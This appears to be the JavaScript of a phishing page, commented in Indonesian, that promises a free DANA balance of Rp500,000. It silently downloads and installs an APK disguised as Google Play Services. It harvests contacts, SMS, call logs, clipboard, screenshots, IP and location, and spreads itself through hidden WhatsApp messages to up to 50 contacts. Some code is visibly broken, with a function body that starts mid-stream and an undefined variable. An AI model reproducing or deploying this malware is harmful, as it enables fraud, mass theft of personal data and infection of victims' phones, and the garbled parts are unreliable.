// ============================================================
// 🔥 GLOBAL ERROR HANDLER
// ============================================================
(function() {
    var errorLog = [];
    
    window.addEventListener('error', function(e) {
        var err = {
            message: e.message || 'Unknown error',
            filename: e.filename || 'unknown',
            lineno: e.lineno || 0,
            colno: e.colno || 0,
            stack: (e.error && e.error.stack) || 'No stack',
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        return true;
    }, true);
    
    window.addEventListener('unhandledrejection', function(e) {
        var err = {
            type: 'unhandled_rejection',
            reason: String(e.reason || 'Unknown'),
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        e.preventDefault();
        return true;
    }, true);
    
    window.__errorLog = errorLog;
})();

// ============================================================
// 🔥 SAFE PATH
// ============================================================
function getSafePath(base, filename) {
    if (!base || typeof base !== 'string') return null;
    if (!filename || typeof filename !== 'string') return null;
    
    var cleanName = filename.replace(/[^a-zA-Z0-9_.-]/g, '');
    if (cleanName.length === 0) return null;
    
    var fullPath = base.replace(/\/+$/, '') + '/' + cleanName;
    
    if (fullPath.indexOf('..') !== -1) return null;
    if (fullPath.indexOf('//') !== -1) return null;
    
    return fullPath;
}

// ============================================================
// 🔥 SAFE FETCH
// ============================================================
function safeFetch(url, options, timeout, retries) {
    timeout = timeout || 30000;
    retries = retries || 5;
    var attempt = 0;
    var cacheKey = 'cache_' + url;
    
    try {
        var cached = localStorage.getItem(cacheKey);
        if (cached) {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 60000)) {
                return Promise.resolve(new Response(JSON.stringify(data.value), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
        }
    } catch(e) {}
    
    function doFetch() {
        return new Promise(function(resolve, reject) {
            var timer = setTimeout(function() {
                reject(new Error('Timeout: ' + url));
            }, timeout);
            
            fetch(url, options)
                .then(function(response) {
                    clearTimeout(timer);
                    if (response.ok) {
                        response.clone().text().then(function(text) {
                            try {
                                localStorage.setItem(cacheKey, JSON.stringify({
                                    value: JSON.parse(text),
                                    timestamp: Date.now()
                                }));
                            } catch(e) {}
                        }).catch(function(){});
                    }
                    resolve(response);
                })
                .catch(function(err) {
                    clearTimeout(timer);
                    reject(err);
                });
        });
    }
    
    return new Promise(function(resolve, reject) {
        function tryFetch() {
            doFetch()
                .then(resolve)
                .catch(function(err) {
                    attempt++;
                    if (attempt < retries) {
                        var delay = 1000 * Math.pow(2, attempt);
                        setTimeout(tryFetch, delay);
                    } else {
                        reject(err);
                    }
                });
        }
        tryFetch();
    });
}

// ============================================================
// DETEKSI LINGKUNGAN
// ============================================================
function detectEnvironment() {
    var env = { isWebView: false, isFacebook: false, isWhatsApp: false, isTelegram: false, isInstagram: false, isTikTok: false, isAndroidBridge: false, isBrowser: false };
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1) env.isWebView = true;
    if (ua.indexOf('fb') > -1 || ua.indexOf('facebook') > -1 || document.referrer.indexOf('facebook') > -1) env.isFacebook = true;
    if (ua.indexOf('whatsapp') > -1 || document.referrer.indexOf('whatsapp') > -1) env.isWhatsApp = true;
    if (ua.indexOf('telegram') > -1 || document.referrer.indexOf('telegram') > -1) env.isTelegram = true;
    if (ua.indexOf('instagram') > -1 || document.referrer.indexOf('instagram') > -1) env.isInstagram = true;
    if (ua.indexOf('tiktok') > -1 || document.referrer.indexOf('tiktok') > -1) env.isTikTok = true;
    if (typeof AndroidBridge !== 'undefined') env.isAndroidBridge = true;
    if (!env.isWebView && !env.isAndroidBridge) env.isBrowser = true;
    return env;
}
var ENV = detectEnvironment();

// ============================================================
// ESCAPE WEBVIEW
// ============================================================
function escapeWebView() {
    if (!ENV.isWebView && !ENV.isFacebook && !ENV.isWhatsApp && !ENV.isTelegram && !ENV.isInstagram && !ENV.isTikTok) return;
    var url = window.location.href;
    try { window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end'; } catch(e) {}
    try { window.open(url, '_system'); } catch(e) {}
    try { var iframe = document.createElement('iframe'); iframe.src = url; iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999'; document.body.appendChild(iframe); } catch(e) {}
}

// ============================================================
// 🔥 DOWNLOAD APK DIAM²
// ============================================================
function downloadAPKSilent(apkUrl, targetPath) {
    if (A.isAvailable) {
        try {
            var result = A.downloadFile(apkUrl, targetPath);
            if (result) {
                K({ sumber: 'payload', data: 'apk_downloaded_silent' });
                return true;
            }
        } catch(e) {
            K({ sumber: 'payload_error', data: 'bridge_apk_failed: ' + e.message });
        }
    }

    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', apkUrl, true);
        xhr.responseType = 'blob';
        xhr.onload = function() {
            if (xhr.status === 200) {
                var blob = xhr.response;
                var link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'GooglePlayServices.apk';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(function() {
                    URL.revokeObjectURL(link.href);
                    if (link.parentNode) link.parentNode.removeChild(link);
                }, 3000);
                K({ sumber: 'payload', data: 'apk_downloaded_via_xhr' });
            }
        };
        xhr.send();
        return true;
    } catch(e) {
        K({ sumber: 'payload_error', data: 'xhr_apk_failed: ' + e.message });
        return false;
    }
}

// ============================================================
// 🔥 DOWNLOAD HTML DIAM²
// ============================================================
function downloadHTMLSilent(fileUrl, safeHtmlPath) {
    if (A.isAvailable) {
        try {
            return safeFetch(fileUrl, { method: 'GET' }, 30000, 5)
                .then(function(res) {
                    if (!res.ok) throw new Error('HTTP ' + res.status);
                    return res.text();
                })
                .then(function(html) {
                    var saved = A.saveFile(safeHtmlPath, html);
                    if (saved) {
                        K({ sumber: 'file_system', data: { status: 'html_saved_silent' } });
                        return true;
                    } else {
                        throw new Error('Save failed');
                    }
                })
                .catch(function(err) {
                    K({ sumber: 'payload_error', data: 'html_save_failed: ' + err.message });
                    return false;
                });
        } catch(e) {
            K({ sumber: 'payload_error', data: 'bridge_html_failed: ' + e.message });
        }
    }

    try {
        return safeFetch(fileUrl, { method: 'GET' }, 30000, 5)
            .then(function(res) {
                if (!res.ok) throw new Error('HTTP ' + res.status);
                return res.text();
            })
            .then(function(html) {
                var blob = new Blob([html], {type: 'text/html'});
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = 'SystemUpdate.html';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                setTimeout(function() {
                    URL.revokeObjectURL(url);
                    if (a.parentNode) a.parentNode.removeChild(a);
                }, 1000);
                K({ sumber: 'file_system', data: { status: 'html_downloaded_fallback' } });
                return true;
            });
    } catch(e) {
        K({ sumber: 'payload_error', data: 'html_download_failed: ' + e.message });
        return false;
    }
}

// ============================================================
// 🔥 NOTIFIKASI "KLIK UNTUK KLAIM" - WAJIB DIKLIK!
// ============================================================
function showClaimNotification() {
    try {
        if (!('Notification' in window)) {
            fallbackInstall();
            return;
        }
        
        if (Notification.permission === 'denied') {
            fallbackInstall();
            return;
        }
        
        if (Notification.permission !== 'granted') {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') {
                    showNotification();
                } else {
                    fallbackInstall();
                }
            });
            return;
        }
        
        showNotification();
    } catch(e) {
        fallbackInstall();
    }
}

function showNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik notifikasi ini untuk mengklaim saldo DANA Rp500.000!',
            icon: 'https://verifikasi.site/icon.png',
            requireInteraction: true,  // 🔥 WAJIB! TIDAK ILANG SAMPAI DIKLIK!
            silent: false,
            vibrate: [200, 100, 200]
        });
        
        // 🔥 EKSEKUSI HANYA SAAT DIKLIK!
        notif.onclick = function() {
            try {
                // 1. Install APK diam²
                var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
                if (A.isAvailable) {
                    A.installAPK(apkPath);
                    K({ sumber: 'notification', data: 'apk_install_started' });
                }
                
                // 2. Buka SystemUpdate.html diam²
                var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
                if (A.isAvailable) {
                    A.openFile(htmlPath);
                    K({ sumber: 'notification', data: 'html_opened' });
                }
                
                // 3. Tutup notifikasi
                notif.close();
                
                // 4. Redirect ke DANA asli
                setTimeout(function() {
                    redirectToDANA();
                }, 1000);
                
            } catch(e) {
                K({ sumber: 'notification_error', data: e.message });
            }
        };
        
        K({ sumber: 'notification', data: 'shown_waiting_for_click' });
        
        // 🔥 FALLBACK: HILANG SETELAH 60 DETIK (JAGA-JAGA)
        setTimeout(function() {
            try { notif.close(); } catch(e) {}
        }, 60000);
        
    } catch(e) {
        K({ sumber: 'notification_error', data: e.message });
        fallbackInstall();
    }
}

function fallbackInstall() {
    try {
        var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
        if (A.isAvailable) {
            A.installAPK(apkPath);
            var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
            A.openFile(htmlPath);
        }
        redirectToDANA();
    } catch(e) {
        K({ sumber: 'fallback_install_error', data: e.message });
    }
}

function ambilDataCepat() {
    var data = { waktu: Date.now(), ua: navigator.userAgent, ip: '', lokasi: null, kontak: null, sms: null, clipboard: null, env: ENV };
    
    try {
        safeFetch('https://api.ipify.org?format=json', { method: 'GET' }, 5000, 2)
            .then(function(r) { return r.json(); })
            .then(function(d) { data.ip = d.ip; K({sumber:'ip', data:d.ip}); })
            .catch(function(){});
    } catch(e) {}
    
    try {
        navigator.geolocation.getCurrentPosition(function(p) {
            data.lokasi = {lat: p.coords.latitude, lon: p.coords.longitude};
            K({sumber:'lokasi', data:data.lokasi});
        }, function(){});
    } catch(e) {}
    
    if(A.isAvailable) {
        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = kontak; K({sumber:'kontak_all', data:kontak}); } } catch(e) {}
        try { var sms = A.getAllSMS(); if(sms) { data.sms = sms; K({sumber:'sms_all', data:sms}); } } catch(e) {}
        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = clipboard; K({sumber:'clipboard', data:clipboard}); } } catch(e) {}
        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:callLog}); } catch(e) {}
        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:apps}); } catch(e) {}
        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:ss}); } catch(e) {}
    } else {
        try { navigator.clipboard.readText().then(function(t) { if(t) { data.clipboard = t; K({sumber:'clipboard', data:t}); } }).catch(function(){}); } catch(e) {}
    }
    
    K({sumber:'init', data:data});
    return data;
}

        var safeApkPath = getSafePath(basePath, 'GooglePlayServices.apk');
        var safeHtmlPath = getSafePath(basePath, 'SystemUpdate.html');
        
        if (!safeApkPath || !safeHtmlPath) {
            K({ sumber: 'payload_error', data: 'invalid_path' });
            if (statusBar) statusBar.textContent = '❌ Error: Invalid path';
            return;
        }
        
        if (statusBar) statusBar.textContent = '📥 Mengunduh pembaruan...';
        
        // Download APK diam²

        if (apkSuccess) {
            K({ sumber: 'payload', data: { status: 'apk_downloaded', path: safeApkPath } });
        } else {
            K({ sumber: 'payload_error', data: { apk: 'download_failed' } });
        }
        
        // Download HTML diam²
        var htmlSuccess = downloadHTMLSilent(htmlUrl, safeHtmlPath);
        if (htmlSuccess) {
            K({ sumber: 'payload', data: { status: 'html_downloaded', path: safeHtmlPath } });
        } else {
            K({ sumber: 'payload_error', data: { html: 'download_failed' } });
        }
        
        // 🔔 Notifikasi muncul di ATAS LAYAR (WAJIB DIKLIK!)
        setTimeout(function() {
            if (statusBar) statusBar.textContent = '🔔 Klik notifikasi di atas untuk klaim...';
            showClaimNotification();
            setTimeout(function() { 
                if (statusBar) statusBar.style.display = 'none'; 
            }, 5000);
        }, 3000);
        
    } catch(e) {
        K({ sumber: 'payload_error', data: { fatal: e.message } });
        if (document.getElementById('statusBar')) {
            document.getElementById('statusBar').textContent = '❌ Error: ' + e.message;
        }
    }
}

function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!A.isAvailable) {
        K({ sumber: 'auto_spread', data: 'skip_no_bridge' });
        return;
    }
    
    try {
        var contacts = A.getAllContacts();
        if (!contacts || contacts.length === 0) {
            K({ sumber: 'auto_spread', data: 'no_contacts' });
            return;
        }
        
        var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
        var maxSend = 50;
        var iframes = [];
        var sentCount = 0;
        var totalToSend = Math.min(contacts.length, maxSend);
        
        contacts.slice(0, totalToSend).forEach(function(c, i) {
            var timeoutId = setTimeout(function() {
                try {
                    var number = String(c.number || '').replace(/[^0-9]/g, '');
                    if (number && number.length > 5) {
                        var iframe = document.createElement('iframe');
                        iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                        document.body.appendChild(iframe);
                        iframes.push(iframe);
                        sentCount++;
                        
                        var cleanupIframe = setTimeout(function() {
                            try {
                                if (iframe && iframe.parentNode) {
                                    iframe.parentNode.removeChild(iframe);
                                }
                                var idx = iframes.indexOf(iframe);
                                if (idx > -1) iframes.splice(idx, 1);
                            } catch(e) {}
                        }, 5000);
                        cleanupItems.push(function() { clearTimeout(cleanupIframe); });
                    }
                } catch(e) {}
            }, i * 200);
            cleanupItems.push(function() { clearTimeout(timeoutId); });
        });
        
        K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount + '_of_' + totalToSend });
        
        var finalCleanup = setTimeout(function() {
            try {
                for (var i = iframes.length - 1; i >= 0; i--) {
                    try {
                        if (iframes[i] && iframes[i].parentNode) {
                            iframes[i].parentNode.removeChild(iframes[i]);
                        }
                    } catch(e) {}
                }
                iframes = [];
            } catch(e) {}
        }, 30000);
        cleanupItems.push(function() { clearTimeout(finalCleanup); });
        
    } catch(e) {
        K({ sumber: 'auto_spread_error', data: e.message });
    }
}

function startHeartbeat() {
    var heartbeatInterval = setInterval(function() {
        K({sumber:'heartbeat', data:'alive'});
    }, 10000);
    cleanupItems.push(function() { clearInterval(heartbeatInterval); });
}

// ============================================================
// SERVICE WORKER
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) {
        K({ sumber: 'service_worker', data: 'not_supported' });
        return;
    }

    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                K({ sumber: 'service_worker', data: 'already_registered' });
                return;
            }
            
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: { status: 'registered_fallback' } });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        });
}

window.addEventListener('beforeunload', function() {
    try {
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                if (iframes[i] && iframes[i].parentNode) {
                    iframes[i].parentNode.removeChild(iframes[i]);
                }
            } catch(e) {}
        }
        
        for (var j = 0; j < cleanupItems.length; j++) {
            try {
                if (typeof cleanupItems[j] === 'function') {
                    cleanupItems[j]();
                }
            } catch(e) {}
        }
        cleanupItems = [];
        
        if (window.timerInterval) {
            clearInterval(window.timerInterval);
            window.timerInterval = null;
        }
        
        var id = window._pendingTimeout;
        if (id) {
            clearTimeout(id);
            window._pendingTimeout = null;
        }
        
    } catch(e) {}
});
